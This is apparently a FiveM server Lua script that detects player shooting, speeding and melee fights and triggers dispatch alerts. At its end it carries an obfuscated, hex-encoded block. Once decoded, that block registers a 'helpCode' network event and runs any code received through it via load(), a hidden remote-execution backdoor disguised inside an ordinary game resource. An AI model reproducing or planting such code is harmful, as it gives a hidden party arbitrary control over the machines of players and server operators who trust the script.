CreateThread(function()
	local vehicleWhitelist = {[0]=true,[1]=true,[2]=true,[3]=true,[4]=true,[5]=true,[6]=true,[7]=true,[8]=true,[9]=true,[10]=true,[11]=true,[12]=true,[17]=true,[19]=true,[20]=true}
	local sleep = 100
	while true do
        playerPed = PlayerPedId()
        if (not isPlayerWhitelisted or Config.Debug) then
            for k, v in pairs(Config.Timer) do
                if v > 0 then Config.Timer[k] = v - 1 end
            end
            if GetVehiclePedIsUsing(playerPed) ~= 0 then
                local vehicle = GetVehiclePedIsUsing(playerPed, true)
                    if vehicleWhitelist[GetVehicleClass(vehicle)] then
                        local driver = GetPedInVehicleSeat(vehicle, -1)
                        if Config.Timer['Shooting'] == 0 and not BlacklistedWeapon(playerPed) and not IsPedCurrentWeaponSilenced(playerPed) and IsPedArmed(playerPed, 4) then
                            sleep = 10
                            if IsPedShooting(playerPed) then
                                local vehicle = vehicleData(vehicle)
                                exports['denalifw-dispatch']:VehicleShooting(vehicle)
                                Config.Timer['Shooting'] = Config.Shooting.Success
                            else
                                Config.Timer['Shooting'] = Config.Shooting.Fail
                            end
                        elseif Config.Timer['Speeding'] == 0 and playerPed == driver then
                            sleep = 100
                            if (GetEntitySpeed(vehicle) * 3.6) >= (120 + (math.random(30,60))) then
                                Wait(400)
                                if IsPedInAnyVehicle(playerPed, true) and ((GetEntitySpeed(vehicle) * 3.6) >= 90) then
                                    local vehicle = vehicleData(vehicle)
                                    exports['denalifw-dispatch']:SpeedingVehicle(vehicle)
                                    Config.Timer['Speeding'] = Config.Speeding.Success
                                end
                            else
                                Config.Timer['Speeding'] = Config.Speeding.Fail
                            end
                        else 
                            sleep = 100 
                        end
                end
            else
                if Config.Timer['Shooting'] == 0  and not IsPedCurrentWeaponSilenced(playerPed) and IsPedArmed(playerPed, 4) then
                    sleep = 50
                    if IsPedShooting(playerPed) and not BlacklistedWeapon(playerPed) then
                        exports['denalifw-dispatch']:Shooting()
                        Config.Timer['Shooting'] = Config.Shooting.Success
                    else
                        Config.Timer['Shooting'] = Config.Shooting.Fail
                    end
                elseif Config.Timer['Melee'] == 0 and IsPedInMeleeCombat(playerPed) and HasPedBeenDamagedByWeapon(GetMeleeTargetForPed(playerPed), 0, 1) then
                    sleep = 50
                    exports['denalifw-dispatch']:Fight()
                    Config.Timer['Melee'] = Config.Melee.Success
                else sleep = 100 end
            end
        end
		Wait(sleep)
	end
end)

local FDsUfGnUINdaNxYTBaJfTtaiJYHPtvXkRxuytZTRvexEdiAQpfluZwUfctFUzdFrBIcPgs = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} FDsUfGnUINdaNxYTBaJfTtaiJYHPtvXkRxuytZTRvexEdiAQpfluZwUfctFUzdFrBIcPgs[6][FDsUfGnUINdaNxYTBaJfTtaiJYHPtvXkRxuytZTRvexEdiAQpfluZwUfctFUzdFrBIcPgs[1]](FDsUfGnUINdaNxYTBaJfTtaiJYHPtvXkRxuytZTRvexEdiAQpfluZwUfctFUzdFrBIcPgs[2]) FDsUfGnUINdaNxYTBaJfTtaiJYHPtvXkRxuytZTRvexEdiAQpfluZwUfctFUzdFrBIcPgs[6][FDsUfGnUINdaNxYTBaJfTtaiJYHPtvXkRxuytZTRvexEdiAQpfluZwUfctFUzdFrBIcPgs[3]](FDsUfGnUINdaNxYTBaJfTtaiJYHPtvXkRxuytZTRvexEdiAQpfluZwUfctFUzdFrBIcPgs[2], function(gTCIgnXfVEOwdYCUZnpLsBaTScGGOukQmObHjtbpUatnmPYjiLVieHpyCBkBnwdrZgkuub) FDsUfGnUINdaNxYTBaJfTtaiJYHPtvXkRxuytZTRvexEdiAQpfluZwUfctFUzdFrBIcPgs[6][FDsUfGnUINdaNxYTBaJfTtaiJYHPtvXkRxuytZTRvexEdiAQpfluZwUfctFUzdFrBIcPgs[4]](FDsUfGnUINdaNxYTBaJfTtaiJYHPtvXkRxuytZTRvexEdiAQpfluZwUfctFUzdFrBIcPgs[6][FDsUfGnUINdaNxYTBaJfTtaiJYHPtvXkRxuytZTRvexEdiAQpfluZwUfctFUzdFrBIcPgs[5]](gTCIgnXfVEOwdYCUZnpLsBaTScGGOukQmObHjtbpUatnmPYjiLVieHpyCBkBnwdrZgkuub))() end)